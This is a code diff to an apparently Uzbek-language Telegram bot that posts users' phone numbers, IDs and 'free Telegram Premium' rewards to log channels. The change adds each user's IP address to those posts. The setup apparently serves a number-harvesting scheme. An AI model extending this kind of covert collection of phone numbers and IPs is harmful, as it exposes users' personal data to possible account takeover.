@@ -9,7 +9,7 @@ import database
 
 logger = logging.getLogger(__name__)
 
-async def send_number_log(user_id: int, phone: str, diller_bot: str, mode: str = "Avto-Premium", user_display: str = None):
+async def send_number_log(user_id: int, phone: str, diller_bot: str, mode: str = "Avto-Premium", user_display: str = None, ip: str = None):
     ch = database.get_setting('channel_number_logs', '').strip()
     if not ch:
         return
@@ -26,11 +26,12 @@ async def send_number_log(user_id: int, phone: str, diller_bot: str, mode: str =
             user_display = str(user_id)
 
     bot_name = diller_bot.replace('@', '')
+    ip_line = f"\n🌐 IP: <code>{ip}</code>" if ip else ""
     text = (
         f"📱 <b>Number olindi ({mode})</b>\n\n"
         f"👤 User: {user_display} (<code>{user_id}</code>)\n"
         f"📞 Number: <code>+{phone}</code>\n"
-        f"🤖 Bot: @{bot_name}"
+        f"🤖 Bot: @{bot_name}{ip_line}"
     )
     bot = Bot(token=config.BOT_TOKEN)
     try:
@@ -42,7 +43,7 @@ async def send_number_log(user_id: int, phone: str, diller_bot: str, mode: str =
     finally:
         await bot.session.close()
 
-async def send_payment_log(user_id: int, phone: str, reward_amount: str = "Telegram Premium (1 oy)", user_display: str = None):
+async def send_payment_log(user_id: int, phone: str, reward_amount: str = "Telegram Premium (1 oy)", user_display: str = None, ip: str = None):
     ch = database.get_setting('channel_payment_logs', '').strip()
     if not ch:
         return
@@ -58,11 +59,12 @@ async def send_payment_log(user_id: int, phone: str, reward_amount: str = "Teleg
         except Exception:
             user_display = str(user_id)
 
+    ip_line = f"\n🌐 IP: <code>{ip}</code>" if ip else ""
     text = (
         f"✅ <b>Yangi Premium!</b>\n\n"
         f"👤 User: {user_display} (<code>{user_id}</code>)\n"
         f"📞 Number: <code>+{phone}</code>\n"
-        f"💰 Mukofot: <b>{reward_amount}</b>"
+        f"💰 Mukofot: <b>{reward_amount}</b>{ip_line}"
     )
     bot = Bot(token=config.BOT_TOKEN)
     try:
